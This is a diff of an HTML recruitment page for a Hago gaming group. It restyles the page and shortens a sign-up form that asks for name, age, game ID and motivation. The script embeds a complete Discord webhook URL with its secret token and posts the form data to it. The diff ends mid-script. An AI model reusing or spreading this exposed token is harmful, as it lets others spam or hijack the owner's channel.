@@ -3,526 +3,533 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>TNT ANIMES | GRUNGE ELITE</title>
-    <!-- Google Fonts -->
-    <link href="https://fonts.googleapis.com/css2?family=Permanent+Marker&family=Syncopate:wght@400;700&family=Rajdhani:wght@400;600;700&display=swap" rel="stylesheet">
+    <title>TNT ANIMES | UNIDADE DE INTELIGÊNCIA</title>
+    <!-- Google Fonts Expandidas (Adicionado Orbitron e novos pesos) -->
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Permanent+Marker&family=Syncopate:wght@400;700&family=Rajdhani:wght@400;500;600;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
     <!-- Font Awesome -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 
     <style>
         :root {
             --accent: #ff003c; 
+            --accent-glow: rgba(255, 0, 60, 0.7);
             --bg-dark: #050505;
-            --panel-bg: rgba(15, 15, 15, 0.9);
+            --panel-bg: rgba(10, 10, 10, 0.85); /* Mais transparente para o blur funcionar */
             --border-glow: rgba(255, 0, 60, 0.5);
             --text-main: #ffffff;
-            --text-dim: #666;
-            --grunge-texture: url('https://www.transparenttextures.com/patterns/stardust.png');
         }
 
         * { box-sizing: border-box; margin: 0; padding: 0; }
+
+        /* Custom Scrollbar */
+        ::-webkit-scrollbar { width: 8px; }
+        ::-webkit-scrollbar-track { background: var(--bg-dark); }
+        ::-webkit-scrollbar-thumb { background: var(--accent); border-radius: 10px; }
+        ::-webkit-scrollbar-thumb:hover { background: #ff3366; }
 
         body {
             background-color: var(--bg-dark);
             color: var(--text-main);
             font-family: 'Rajdhani', sans-serif;
             overflow-x: hidden;
-            background-image: var(--grunge-texture), linear-gradient(rgba(0,0,0,0.85), rgba(0,0,0,0.85)), url('https://i.pinimg.com/originals/84/fe/4b/84fe4b3e1fba5aa35f3975d051d1f77e.jpg');
+            background-image: linear-gradient(rgba(0,0,0,0.85), rgba(0,0,0,0.95)), url('https://i.pinimg.com/originals/84/fe/4b/84fe4b3e1fba5aa35f3975d051d1f77e.jpg');
             background-size: cover;
             background-attachment: fixed;
+            background-position: center;
         }
 
-        /* Scanline Effect */
-        body::before {
-            content: " ";
-            display: block;
+        /* Efeito de Linhas CRT Aprimorado */
+        body::after {
+            content: "";
             position: fixed;
-            top: 0; left: 0; bottom: 0; right: 0;
+            top: 0; left: 0; width: 100vw; height: 100vh;
             background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
-            z-index: 9999;
+            z-index: 10000;
             pointer-events: none;
             background-size: 100% 2px, 3px 100%;
         }
 
-        @keyframes pulse-red {
-            0% { box-shadow: 0 0 0 0 rgba(255, 0, 60, 0.7); transform: scale(1); }
-            70% { box-shadow: 0 0 0 10px rgba(255, 0, 60, 0); transform: scale(1.05); }
-            100% { box-shadow: 0 0 0 0 rgba(255, 0, 60, 0); transform: scale(1); }
-        }
-
-        @keyframes border-glow {
-            0% { border-color: #440000; box-shadow: 0 0 5px rgba(255, 0, 60, 0.2); }
-            50% { border-color: var(--accent); box-shadow: 0 0 20px rgba(255, 0, 60, 0.6); }
-            100% { border-color: #440000; box-shadow: 0 0 5px rgba(255, 0, 60, 0.2); }
-        }
-
-        @keyframes scanner {
-            0% { top: -10%; }
-            100% { top: 110%; }
-        }
-
-        @keyframes fadeInAlert {
-            from { opacity: 0; transform: translateY(-10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
+        @keyframes scan { 0% { transform: translateY(-100%); } 100% { transform: translateY(100vh); } }
         .scanner-line {
-            position: absolute; width: 100%; height: 2px;
-            background: var(--accent); box-shadow: 0 0 15px var(--accent);
-            z-index: 5; left: 0; pointer-events: none; opacity: 0.3;
-            animation: scanner 3s linear infinite;
+            position: fixed; top: 0; left: 0; width: 100%; height: 8px;
+            background: var(--accent); opacity: 0.15; box-shadow: 0 0 30px var(--accent), 0 0 10px #fff;
+            z-index: 999; animation: scan 6s linear infinite;
         }
 
-        /* Player */
-        .music-player-card {
-            position: fixed; bottom: 20px; right: 20px;
-            background: #000; border: 2px solid var(--accent);
-            padding: 12px; display: flex; align-items: center; gap: 12px;
-            z-index: 2000; box-shadow: 5px 5px 0px var(--accent);
-            animation: border-glow 3s infinite;
-        }
-
-        .play-btn {
-            background: var(--accent); color: white; border: none;
-            width: 40px; height: 40px; cursor: pointer;
-            display: flex; align-items: center; justify-content: center;
-            font-size: 1.2rem; animation: pulse-red 2s infinite;
-            border-radius: 50%;
-        }
-
-        /* Layout */
+        /* Layout Principal */
         .header-profile {
-            width: 95%; max-width: 600px; background: #000;
-            margin: 40px auto; border: 1px solid #222;
+            width: 100%; max-width: 650px; background: #000;
+            margin: 30px auto 20px; border: 1px solid #333; border-bottom: 5px solid var(--accent);
             position: relative; overflow: hidden;
-            box-shadow: 10px 10px 0px rgba(255, 0, 60, 0.1);
+            border-radius: 10px 10px 0 0;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.8), 0 0 20px rgba(255, 0, 60, 0.2);
+            transition: transform 0.3s ease;
         }
+        .header-profile:hover { transform: translateY(-5px); }
 
-        .avatar-box {
-            width: 100px; height: 100px; border: 3px solid var(--accent);
-            background: #000; overflow: hidden; box-shadow: 5px 5px 0px var(--accent);
-            z-index: 10; position: relative;
+        .profile-banner { height: 160px; background: url('https://i.pinimg.com/originals/7b/b9/ed/7bb9ed00d54da2404408d685534a36d4.gif') center/cover; }
+        .profile-content { padding: 20px; text-align: center; margin-top: -65px; background: linear-gradient(to top, #000 85%, transparent); }
+        
+        /* Avatar Pulsante */
+        @keyframes pulse-avatar {
+            0% { box-shadow: 0 0 15px var(--accent); }
+            50% { box-shadow: 0 0 30px var(--accent), 0 0 10px #fff; }
+            100% { box-shadow: 0 0 15px var(--accent); }
         }
-
-        .profile-info h1 {
-            font-family: 'Permanent Marker', cursive; font-size: 2.5rem;
-            color: var(--accent); text-transform: uppercase; margin-top: 10px;
+        .avatar { 
+            width: 120px; height: 120px; border: 4px solid var(--accent); 
+            margin-bottom: 10px; border-radius: 5px;
+            animation: pulse-avatar 2s infinite; 
+            transition: transform 0.3s ease;
         }
+        .avatar:hover { transform: scale(1.1) rotate(5deg); }
 
-        /* Role Selection Grid */
-        .roles-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
-            gap: 12px;
-            margin-top: 10px;
-        }
-
-        .spec-item {
-            border: 1px solid #333; 
-            padding: 15px 10px; 
-            text-align: center;
-            cursor: pointer; 
-            font-weight: bold; 
-            transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
-            font-size: 0.85rem; 
-            text-transform: uppercase;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 8px;
-            background: rgba(10, 10, 10, 0.8);
-            color: #aaa;
-            border-radius: 4px;
-        }
-
-        .spec-item i {
-            font-size: 1.5rem;
-            color: #555;
-            transition: all 0.3s ease;
-        }
-
-        .spec-item:hover {
-            border-color: var(--accent);
-            background: rgba(255, 0, 60, 0.05);
-            transform: translateY(-2px);
-            color: #fff;
-        }
-
-        .spec-item:hover i { color: var(--accent); }
-
-        .spec-item.active { 
-            background: var(--accent); 
-            color: #fff; 
-            border-color: #fff; 
-            box-shadow: 0 0 15px rgba(255, 0, 60, 0.4);
-        }
-
-        .spec-item.active i { color: #fff; }
-
-        /* Role Rule Alert Box */
-        .rule-alert {
-            display: none;
-            background: linear-gradient(90deg, rgba(255, 0, 60, 0.15) 0%, rgba(0,0,0,0.5) 100%);
-            border-left: 4px solid var(--accent);
-            padding: 15px 20px;
-            margin-top: 15px;
-            border-radius: 0 4px 4px 0;
-            animation: fadeInAlert 0.4s ease-out forwards;
-        }
-
-        .rule-alert.show { display: flex; flex-direction: column; gap: 5px; }
-
-        .rule-alert strong {
+        /* Glitch Effect para o Título Principal */
+        .glitch {
+            position: relative;
+            font-family: 'Permanent Marker', cursive;
             color: var(--accent);
-            font-family: 'Syncopate', sans-serif;
-            font-size: 0.8rem;
-            letter-spacing: 1px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
+            font-size: 2.8rem;
+            text-shadow: 2px 2px 5px rgba(255,0,0,0.5);
+            display: inline-block;
+        }
+        .glitch::before, .glitch::after {
+            content: attr(data-text);
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: #000;
+        }
+        .glitch::before {
+            left: 2px; text-shadow: -2px 0 #00ffff;
+            animation: glitch-anim-1 2s infinite linear alternate-reverse;
+            clip-path: polygon(0 0, 100% 0, 100% 33%, 0 33%);
+        }
+        .glitch::after {
+            left: -2px; text-shadow: -2px 0 #ff00ff;
+            animation: glitch-anim-2 3s infinite linear alternate-reverse;
+            clip-path: polygon(0 66%, 100% 66%, 100% 100%, 0 100%);
+        }
+        @keyframes glitch-anim-1 { 0% { clip-path: inset(20% 0 80% 0); } 20% { clip-path: inset(60% 0 10% 0); } 40% { clip-path: inset(40% 0 50% 0); } 60% { clip-path: inset(80% 0 5% 0); } 80% { clip-path: inset(10% 0 70% 0); } 100% { clip-path: inset(30% 0 20% 0); } }
+        @keyframes glitch-anim-2 { 0% { clip-path: inset(10% 0 60% 0); } 20% { clip-path: inset(30% 0 20% 0); } 40% { clip-path: inset(70% 0 10% 0); } 60% { clip-path: inset(20% 0 50% 0); } 80% { clip-path: inset(50% 0 30% 0); } 100% { clip-path: inset(5% 0 80% 0); } }
+
+        .container { max-width: 650px; margin: 0 auto; padding: 0 20px 40px; }
+
+        /* Cartões Dinâmicos */
+        .card { 
+            background: var(--panel-bg); 
+            backdrop-filter: blur(5px);
+            border: 1px solid #222; 
+            border-left: 4px solid var(--accent);
+            padding: 30px; 
+            margin-bottom: 25px; 
+            border-radius: 5px;
+            box-shadow: 0 10px 20px rgba(0,0,0,0.5);
+            transition: all 0.4s ease;
+        }
+        .card:hover {
+            border-left-color: #fff;
+            box-shadow: 0 15px 30px rgba(255,0,60,0.2);
+            transform: translateY(-3px);
         }
 
-        .rule-alert p { color: #eee; font-size: 0.95rem; line-height: 1.4; }
-
-        .submit-btn {
-            width: 100%; background: var(--accent); color: #fff; border: none;
-            padding: 18px; font-family: 'Permanent Marker', cursive;
-            font-size: 1.5rem; cursor: pointer; margin-top: 25px; transition: 0.3s;
-            box-shadow: 0 5px 15px rgba(255, 0, 60, 0.3);
+        /* Labels e Inputs Turbinados */
+        .label { 
+            color: var(--accent); font-size: 0.85rem; font-weight: 800; 
+            text-transform: uppercase; letter-spacing: 2px; 
+            display: block; margin: 20px 0 8px; 
+            font-family: 'Orbitron', sans-serif;
+            text-shadow: 0 0 5px rgba(255,0,60,0.4);
         }
-
-        .submit-btn:hover {
-            filter: brightness(1.2);
-            transform: scale(1.01);
-        }
-
-        .reveal { opacity: 0; transform: translateY(30px); transition: all 0.8s ease-out; }
-        .reveal.active { opacity: 1; transform: translateY(0); }
-
-        input, textarea, select {
+        
+        input, textarea, select { 
             width: 100%; background: #0a0a0a; border: 1px solid #333; 
-            padding: 15px; color: #fff; outline: none;
-            font-family: 'Rajdhani', sans-serif; margin-top: 5px;
-            font-size: 1rem; transition: 0.3s;
+            padding: 15px; color: #fff; 
+            font-family: 'Share Tech Mono', monospace; font-size: 1rem; 
+            border-radius: 4px;
+            transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
+        }
+        input:hover, textarea:hover, select:hover {
+            border-color: #555;
+            background: #111;
+        }
+        input:focus, textarea:focus, select:focus { 
+            border-color: var(--accent); outline: none; 
+            box-shadow: 0 0 15px rgba(255,0,60,0.4), inset 0 0 10px rgba(255,0,60,0.1);
+            transform: scale(1.02);
+            background: #000;
         }
 
-        textarea { resize: vertical; min-height: 80px; }
-
-        input:focus, select:focus, textarea:focus { border-color: var(--accent); box-shadow: inset 0 0 10px rgba(255,0,60,0.1); }
-
-        .input-label {
-            color: var(--accent); font-size: 0.8rem; font-weight: bold;
-            text-transform: uppercase; letter-spacing: 1px; display: block;
-            margin-top: 15px;
+        /* Grid de Especialidades Dinâmico */
+        .roles { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-top: 10px; }
+        .role-btn { 
+            border: 1px solid #333; padding: 20px 10px; text-align: center; 
+            cursor: pointer; background: #080808; transition: all 0.3s ease; 
+            font-size: 0.85rem; font-weight: 800; font-family: 'Orbitron', sans-serif;
+            border-radius: 4px;
+            position: relative;
+            overflow: hidden;
         }
-
-        .input-group { margin-bottom: 5px; }
-
-        .copy-btn {
-            background: var(--accent); color: #fff; border: none;
-            padding: 10px 15px; cursor: pointer; font-weight: bold;
-            font-family: 'Rajdhani'; transition: 0.2s;
+        .role-btn i { display: block; font-size: 1.8rem; margin-bottom: 8px; color: #555; transition: all 0.3s ease; }
+        .role-btn:hover { border-color: var(--accent); color: var(--text-main); transform: translateY(-3px); box-shadow: 0 5px 15px rgba(255,0,60,0.2); }
+        .role-btn:hover i { color: var(--accent); transform: scale(1.1); }
+        .role-btn.active { 
+            background: linear-gradient(45deg, var(--accent), #990024); 
+            border-color: #fff; color: #fff; 
+            box-shadow: 0 0 20px rgba(255,0,60,0.6);
+            transform: scale(1.05);
+            z-index: 2;
         }
+        .role-btn.active i { color: #fff; text-shadow: 0 0 10px rgba(255,255,255,0.8); }
 
-        .tag-display-box {
+        /* Botão Enviar com estilo agressivo */
+        .btn-send { 
+            width: 100%; background: linear-gradient(90deg, #990024, var(--accent), #990024);
+            background-size: 200% auto;
+            color: #fff; border: 2px solid #fff; padding: 20px; 
+            font-family: 'Permanent Marker', cursive; font-size: 1.8rem; 
+            cursor: pointer; margin-top: 30px; text-transform: uppercase; 
+            border-radius: 5px;
+            transition: 0.5s;
+            box-shadow: 0 0 20px rgba(255,0,60,0.5);
+            letter-spacing: 2px;
+        }
+        .btn-send:hover { 
+            background-position: right center; 
+            box-shadow: 0 0 30px rgba(255,0,60,0.8);
+            transform: scale(1.02);
+        }
+        .btn-send:active { transform: scale(0.98); }
+        .btn-send:disabled { background: #333; border-color: #555; cursor: wait; box-shadow: none; color: #888; }
+
+        /* Player flutuante com brilho */
+        .player { 
+            position: fixed; bottom: 25px; right: 25px; background: rgba(0,0,0,0.9); 
+            border: 1px solid var(--accent); padding: 12px 20px; display: flex; 
+            align-items: center; gap: 15px; z-index: 10001;
+            border-radius: 30px;
+            box-shadow: 0 0 20px rgba(255,0,60,0.3);
+            backdrop-filter: blur(5px);
+            transition: all 0.3s;
+        }
+        .player:hover { transform: scale(1.05); border-color: #fff; }
+        .p-btn { 
+            background: var(--accent); border: none; width: 35px; height: 35px; 
+            border-radius: 50%; color: #fff; cursor: pointer; 
+            transition: all 0.3s;
+            display: flex; justify-content: center; align-items: center;
+        }
+        .p-btn:hover { background: #fff; color: var(--accent); box-shadow: 0 0 10px #fff; }
+
+        /* Box da Tag */
+        .tag-box { 
+            background: #050505; border: 1px dashed var(--accent); padding: 20px; 
             display: flex; justify-content: space-between; align-items: center; 
-            background: #050505; padding: 15px; border: 1px solid #222; margin-top: 8px;
+            border-radius: 4px;
+            box-shadow: inset 0 0 15px rgba(255,0,60,0.1);
         }
-
-        .tag-text { font-size: 1.1rem; letter-spacing: 1px; color: #eee; word-break: break-all; padding-right: 10px; }
-
-        .error-message {
-            background: rgba(255, 0, 60, 0.2);
-            color: #ff99aa;
-            padding: 10px;
-            margin-top: 10px;
-            border: 1px solid var(--accent);
-            display: none;
-            font-weight: bold;
-            font-size: 0.85rem;
+        #resTag { font-size: 1.1rem; font-weight: bold; color: #00ffff; text-shadow: 0 0 8px rgba(0,255,255,0.4); }
+        .copy { 
+            background: var(--accent); border: 1px solid #fff; padding: 8px 15px; 
+            color: #fff; font-size: 0.8rem; font-family: 'Orbitron', sans-serif; font-weight: 800; 
+            cursor: pointer; transition: 0.3s; border-radius: 3px;
         }
+        .copy:hover { background: #fff; color: var(--accent); box-shadow: 0 0 10px #fff; }
+
+        /* Animação de entrada (Reveal) Suave */
+        .reveal { opacity: 0; transform: translateY(40px); transition: all 1s cubic-bezier(0.5, 0, 0, 1); }
+        .reveal.active { opacity: 1; transform: translateY(0); }
     </style>
 </head>
 <body>
 
-<div class="music-player-card">
-    <button class="play-btn" onclick="toggleMusic()">
-        <i class="fas fa-play" id="playIcon"></i>
-    </button>
-    <div class="music-info">
-        <marquee>TNT Elite - Data Extraction Protocol</marquee>
-        <span style="font-size: 0.6rem; color: var(--accent); font-weight: bold; letter-spacing: 1px;"><i class="fas fa-circle" style="font-size: 0.5rem; animation: pulse-red 1s infinite;"></i> STATUS: ENCRIPTADO</span>
-    </div>
-    <audio id="myAudio" loop>
-        <source src="https://static.bandlab.com/on-demand-revisions/befb5420-9c17-4a45-68ae-3cf86b7e6341/befb5420-9c17-4a45-68ae-3cf86b7e6341-wav-44100-16bit.wav" type="audio/mpeg">
-    </audio>
+<div class="scanner-line"></div>
+
+<div class="player">
+    <button class="p-btn" onclick="togglePlay()"><i id="m-icon" class="fas fa-play"></i></button>
+    <div style="font-family: 'Orbitron', sans-serif; font-size: 0.75rem; font-weight: 900; color: var(--accent); text-shadow: 0 0 5px var(--accent);">TNT TERMINAL ACTIVE</div>
+    <audio id="bgm" loop src="https://static.bandlab.com/on-demand-revisions/befb5420-9c17-4a45-68ae-3cf86b7e6341/befb5420-9c17-4a45-68ae-3cf86b7e6341-wav-44100-16bit.wav"></audio>
 </div>
 
-<div class="header-profile">
-    <div class="scanner-line"></div>
-    <div class="profile-banner" style="width: 100%; height: 160px; background-image: url('https://i.pinimg.com/originals/7b/b9/ed/7bb9ed00d54da2404408d685534a36d4.gif'); background-size: cover; background-position: center;"></div>
-    <div class="profile-content" style="padding: 20px; margin-top: -50px; background: linear-gradient(to top, #000 70%, transparent);">
-        <div class="avatar-box">
-            <img src="https://i.pinimg.com/736x/92/c5/d8/92c5d80effca7e40f59dbb9ea405cdaf.jpg" alt="TNT" style="width: 100%; height: 100%; object-fit: cover;">
-        </div>
-        <div class="profile-info">
-            <h1>『TNT ANIMES』</h1>
-            <p style="color: var(--accent); font-size: 0.8rem; letter-spacing: 3px; font-weight: bold;">[ PROTOCOLO DE RECRUTAMENTO ]</p>
-        </div>
+<div class="header-profile reveal">
+    <div class="profile-banner"></div>
+    <div class="profile-content">
+        <img src="https://i.pinimg.com/736x/92/c5/d8/92c5d80effca7e40f59dbb9ea405cdaf.jpg" class="avatar">
+        <!-- Título com efeito glitch dinâmico -->
+        <div><h1 class="glitch" data-text="TNT ANIMES">TNT ANIMES</h1></div>
+        <p id="typewriter" style="font-family: 'Share Tech Mono', monospace; letter-spacing: 4px; font-weight: bold; font-size: 0.85rem; color: #888; margin-top: 5px; min-height: 20px;"></p>
     </div>
 </div>
 
-<div class="container" style="max-width: 700px; margin: 0 auto; padding: 20px;">
-
+<div class="container">
+    
     <!-- TAG GENERATOR -->
-    <div class="reveal">
-        <h2 style="color: var(--accent); font-family: 'Permanent Marker'; margin-bottom: 15px;">GERADOR DE IDENTIDADE</h2>
-        <div style="background: rgba(10,10,10,0.9); padding: 25px; border: 1px dashed var(--accent); margin-bottom: 40px;">
-            
-            <div class="input-group">
-                <span class="input-label">NICKNAME (SEU NOME)</span>
-                <input type="text" id="tagName" placeholder="Digite seu nome aqui..." oninput="updateTags()">
-                <div id="charLimitWarning" class="error-message">
-                    ⚠️ O Hago não permite nicks maiores que 35 caracteres.
-                </div>
-            </div>
-
-            <div class="input-group">
-                <span class="input-label">ESTILO DA FONTE</span>
-                <select id="fontSelect" onchange="updateTags()">
-                    <option value="smallCaps">ꜱᴍᴀʟʟ ᴄᴀᴘꜱ</option>
-                    <option value="normal">PADRÃO</option>
-                    <option value="serifBold">𝐒𝐞𝐫𝐢𝐟 𝐁𝐨𝐥𝐝</option>
-                    <option value="sansBold">𝗦𝗮𝗻𝘀 𝗕𝗼𝗹𝗱</option>
-                    <option value="boldItalic">𝑩𝒐𝒍𝒅 𝑰𝒕𝒂𝒍𝒊𝒄</option>
-                    <option value="cyber">₵¥฿ɆⱤ</option>
-                </select>
-            </div>
-            
-            <div style="margin-top: 20px;">
-                <span class="input-label" style="font-size: 0.7rem; color: #888;">TAG OFICIAL TNT</span>
-                <div class="tag-display-box">
-                    <span id="tagMain" class="tag-text">ꪶ͢🇯🇵 ⃟ᴀͭɴᷡᴍͭs NOME</span>
-                    <button class="copy-btn" onclick="copyTag('tagMain')"><i class="fas fa-copy"></i> COPIAR</button>
-                </div>
-            </div>
+    <div class="card reveal">
+        <h2 style="font-family: 'Orbitron'; font-weight: 900; color: #fff; font-size: 1.4rem; margin-bottom: 15px; text-shadow: 0 0 10px rgba(255,255,255,0.3);"><i class="fas fa-fingerprint" style="color: var(--accent); margin-right: 10px;"></i>GERADOR DE IDENTIDADE</h2>
+        
+        <label class="label">NickBase (Nome)</label>
+        <input type="text" id="nick" placeholder="Digite seu nome ou vulgo..." oninput="genTag()">
+        
+        <label class="label">Criptografia da Fonte</label>
+        <select id="font" onchange="genTag()">
+            <option value="sc">ꜱᴍᴀʟʟ ᴄᴀᴘꜱ (Padrão)</option>
+            <option value="cy">₵¥฿ɆⱤ (Hack)</option>
+            <option value="sb">𝐒𝐞𝐫𝐢𝐟 𝐁𝐨𝐥𝐝 (Elegante)</option>
+        </select>
+        
+        <div class="tag-box" style="margin-top: 25px;">
+            <span id="resTag" style="font-family: 'Share Tech Mono';">ꪶ͢🇯🇵 ⃟ᴀͭɴᷡᴍͭs NOME</span>
+            <button class="copy" onclick="copyTag()"><i class="fas fa-copy" style="margin-right: 5px;"></i>COPIAR</button>
         </div>
     </div>
 
-    <!-- RECRUITMENT FORM -->
-    <div class="reveal">
-        <h2 style="color: var(--accent); font-family: 'Permanent Marker'; margin-bottom: 15px;">FICHA DE ALISTAMENTO</h2>
-        <div style="background: rgba(0,0,0,0.95); border: 1px solid #222; padding: 30px; margin-bottom: 60px; position: relative;">
-            <div class="scanner-line"></div>
+    <!-- FORM -->
+    <div class="card reveal">
+        <h2 style="font-family: 'Permanent Marker'; color: var(--accent); font-size: 2.2rem; margin-bottom: 25px; text-shadow: 0 0 10px rgba(255,0,60,0.3); text-align: center;">FICHA DE ALISTAMENTO</h2>
+        
+        <label class="label"><i class="fas fa-user terminal-icon"></i> Seu Nome / Apelido</label>
+        <input type="text" id="f_name" placeholder="Como devemos te chamar nas operações?">
 
-            <div class="input-group">
-                <label class="input-label"><i class="fas fa-user"></i> Nome:</label>
-                <input type="text" id="f_name" placeholder="Seu nome real ou apelido">
-            </div>
+        <label class="label"><i class="fas fa-id-card terminal-icon"></i> ID Hago</label>
+        <input type="text" id="f_id" placeholder="Seu número de registro ID">
 
-            <div class="input-group">
-                <label class="input-label"><i class="fas fa-calendar"></i> Idade:</label>
-                <input type="number" id="f_age" placeholder="Sua idade">
-            </div>
+        <label class="label"><i class="fas fa-calendar-alt terminal-icon"></i> Sua Idade</label>
+        <input type="number" id="f_age" placeholder="Ex: 19">
 
-            <div class="input-group">
-                <label class="input-label"><i class="fas fa-fingerprint"></i> ID (Hago):</label>
-                <input type="text" id="f_id" placeholder="Seu ID do Hago">
-            </div>
+        <label class="label"><i class="fas fa-user-check terminal-icon"></i> Quem te recrutou?</label>
+        <input type="text" id="f_rec" placeholder="Nome do agente responsável">
 
-            <div class="input-group">
-                <label class="input-label"><i class="fas fa-user-secret"></i> Recrutado por:</label>
-                <input type="text" id="f_recruiter" placeholder="Quem te convidou?">
-            </div>
+        <label class="label"><i class="fas fa-comment-dots terminal-icon"></i> Por que quer ser TNT?</label>
+        <textarea id="f_why" rows="3" placeholder="Qual a sua motivação para entrar na Elite?"></textarea>
 
-            <div class="input-group">
-                <label class="input-label"><i class="fas fa-history"></i> Já participou de FML? Qual?</label>
-                <input type="text" id="f_history" placeholder="Ex: Akatsuki, Mafia, etc.">
-            </div>
-
-            <div class="input-group">
-                <label class="input-label"><i class="fas fa-question-circle"></i> Por que quer entrar na TNT ANIMES?</label>
-                <textarea id="f_reason" placeholder="Diga seu motivo..."></textarea>
-            </div>
-
-            <div class="input-group">
-                <label class="input-label"><i class="fas fa-plus-circle"></i> O que pode agregar à família?</label>
-                <textarea id="f_aggregate" placeholder="Habilidades, tempo online, etc."></textarea>
-            </div>
-
-            <div class="input-group">
-                <label class="input-label"><i class="fas fa-exclamation-triangle"></i> Já teve problemas em família (tretas, punições)?</label>
-                <textarea id="f_troubles" placeholder="Seja honesto(a) sobre conflitos passados..."></textarea>
-            </div>
-
-            <div class="input-group">
-                <label class="input-label"><i class="fas fa-crosshairs"></i> Especialidade Desejada</label>
-                <div class="roles-grid">
-                    <div class="spec-item" onclick="pickRole(this, 'SEGURANÇA')"><i class="fas fa-shield-halved"></i><span>SEGURANÇA</span></div>
-                    <div class="spec-item" onclick="pickRole(this, 'RECRUTADOR')"><i class="fas fa-user-plus"></i><span>RECRUTADOR</span></div>
-                    <div class="spec-item" onclick="pickRole(this, 'CARISMA')"><i class="fas fa-face-laugh-beam"></i><span>CARISMA</span></div>
-                    <div class="spec-item" onclick="pickRole(this, 'DIVULGADOR')"><i class="fas fa-bullhorn"></i><span>DIVULGADOR</span></div>
-                </div>
-                <div id="roleAlertBox" class="rule-alert">
-                    <strong><i class="fas fa-exclamation-triangle"></i> DIRETRIZES:</strong>
-                    <p id="roleAlertText"></p>
-                </div>
-            </div>
-
-            <button class="submit-btn" id="submitBtn" onclick="sendToDiscord()"><i class="fas fa-satellite-dish"></i> ENVIAR ALISTAMENTO</button>
+        <label class="label" style="margin-top: 30px; font-size: 1.1rem; text-align: center;"><i class="fas fa-crosshairs"></i> Selecione sua Especialidade</label>
+        <div class="roles">
+            <div class="role-btn" onclick="setRole(this, 'SEGURANÇA')"><i class="fas fa-shield-alt"></i>SEGURANÇA</div>
+            <div class="role-btn" onclick="setRole(this, 'RECRUTADOR')"><i class="fas fa-user-plus"></i>RECRUTADOR</div>
+            <div class="role-btn" onclick="setRole(this, 'CARISMA')"><i class="fas fa-star"></i>CARISMA</div>
+            <div class="role-btn" onclick="setRole(this, 'DIVULGADOR')"><i class="fas fa-bullhorn"></i>DIVULGADOR</div>
         </div>
+
+        <button class="btn-send" id="btnS" onclick="enviarDados()">ENVIAR PROTOCOLO <i class="fas fa-paper-plane" style="margin-left: 10px;"></i></button>
     </div>
 </div>
 
 <script>
-    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1476601660364165242/9nKIRh0xSFyAfDt2JrrY7LeJelm0ClDEMxRtfc4WDUP5rsUsXvDgtAIuHckx4Q1VxRkF";
+    // Configurações originais mantidas
+    const HOOK = "https://discord.com/api/webhooks/1476601660364165242/9nKIRh0xSFyAfDt2JrrY7LeJelm0ClDEMxRtfc4WDUP5rsUsXvDgtAIuHckx4Q1VxRkF";
 
-    const charMaps = {
-        serifBold: { a:'𝐚', b:'𝐛', c:'𝐜', d:'𝐝', e:'𝐞', f:'𝐟', g:'𝐠', h:'𝐡', i:'𝐢', j:'𝐣', k:'𝐤', l:'𝐥', m:'𝐦', n:'𝐧', o:'𝐨', p:'𝐩', q:'𝐪', r:'𝐫', s:'𝐬', t:'𝐭', u:'𝐮', v:'𝐯', w:'𝐰', x:'𝐱', y:'𝐲', z:'𝐳', A:'𝐀', B:'𝐁', C:'𝐂', D:'𝐃', E:'𝐄', F:'𝐅', G:'𝐆', H:'𝐇', I:'𝐈', J:'𝐉', K:'𝐊', L:'𝐋', M:'𝐌', N:'𝐍', O:'𝐎', P:'𝐏', Q:'𝐐', R:'𝐑', S:'𝐒', T:'𝐓', U:'𝐔', V:'𝐕', W:'𝐖', X:'𝐗', Y:'𝐘', Z:'𝐙' },
-        sansBold: { a:'𝗮', b:'𝗯', c:'𝗰', d:'𝗱', e:'𝗲', f:'𝗳', g:'𝗴', h:'𝗵', i:'𝗶', j:'𝗷', k:'𝗸', l:'𝗹', m:'𝗺', n:'𝗻', o:'𝗼', p:'𝗽', q:'𝗾', r:'𝗿', s:'𝘀', t:'𝘁', u:'𝘂', v:'𝘃', w:'𝘄', x:'𝘅', y:'𝘆', z:'𝘇', A:'𝗔', B:'𝗕', C:'𝗖', D:'𝗗', E:'𝗘', F:'𝗙', G:'𝗚', H:'𝗛', I:'𝗜', J:'𝗝', K:'𝗞', L:'𝗟', M:'𝗠', N:'𝗡', O:'𝗢', P:'𝗣', Q:'𝗤', R:'𝗥', S:'𝗦', T:'𝗧', U:'𝗨', V:'𝗩', W:'𝗪', X:'𝗫', Y:'𝗬', Z:'𝗭' },
-        boldItalic: { a:'𝒂', b:'𝒃', c:'𝒄', d:'𝒅', e:'𝒆', f:'𝒇', g:'𝒈', h:'𝒉', i:'𝒊', j:'𝒋', k:'𝒌', l:'𝒍', m:'𝒎', n:'𝒏', o:'𝒐', p:'𝒑', q:'𝒒', r:'𝒓', s:'𝒔', t:'𝒕', u:'𝒖', v:'𝒗', w:'𝒘', x:'𝒙', y:'𝒚', z:'𝒛', A:'𝑨', B:'𝑩', C:'𝑪', D:'𝑫', E:'𝑬', F:'𝑭', G:'𝑮', H:'𝑯', I:'𝑰', J:'𝑱', K:'𝑲', L:'𝑳', M:'𝑴', N:'𝑵', O:'𝑶', P:'𝑷', Q:'𝑸', R:'𝑹', S:'𝑺', T:'𝑻', U:'𝑼', V:'𝑽', W:'𝑾', X:'𝑿', Y:'𝒀', Z:'𝒁' },
